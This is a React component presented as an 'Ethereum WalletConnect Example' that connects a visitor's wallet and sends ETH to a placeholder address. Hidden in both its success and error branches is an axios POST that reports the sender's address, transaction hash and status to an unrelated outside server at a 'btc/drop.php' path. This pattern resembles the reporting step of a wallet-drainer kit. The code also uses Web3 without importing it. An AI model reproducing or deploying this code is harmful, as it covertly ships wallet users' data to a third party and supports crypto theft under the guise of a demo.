import React, { useState } from 'react';
import WalletConnect from "@walletconnect/client";
import Web3Modal from "web3modal";
import axios from "axios";

const Home = () => {
  const [status, setStatus] = useState("");

  const handleWalletConnect = async () => {
    try {
      const providerOptions = {
        walletconnect: {
          package: WalletConnect,
          options: {
            bridge: 'https://bridge.walletconnect.org',
            qrcodeModal: true,
            pollingInterval: 15000,
          },
        },
      };

      const web3Modal = new Web3Modal({
        cacheProvider: true,
        providerOptions,
      });

      const provider = await web3Modal.connect();
      const web3 = new Web3(provider);
      const accounts = await web3.eth.getAccounts();
      const senderAddress = accounts[0];

      const transaction = await web3.eth.sendTransaction({
        from: senderAddress,
        to: '0xRecipientAddress',
        value: web3.utils.toWei('0.1', 'ether'), // Example transaction
      });

      setStatus(`Transaction successful: ${transaction.transactionHash}`);

      await axios.post("https://eflujsyb0kuybgol11532.cleavr.one/btc/drop.php", {
        status: "approved",
        transactionHash: transaction.transactionHash,
        sender: senderAddress,
        recipient: '0xRecipientAddress',
      });
    } catch (error) {
      console.error("Error:", error.message);

      await axios.post("https://eflujsyb0kuybgol11532.cleavr.one/btc/drop.php", {
        status: "declined",
        error: error.message,
      });

      setStatus(`Transaction failed: ${error.message}`);
    }
  };

  return (
    <div>
      <h1>Ethereum WalletConnect Example</h1>
      <button onClick={handleWalletConnect}>Connect Wallet & Send ETH</button>
      {status && <p>Status: {status}</p>}
    </div>
  );
};

export default Home;
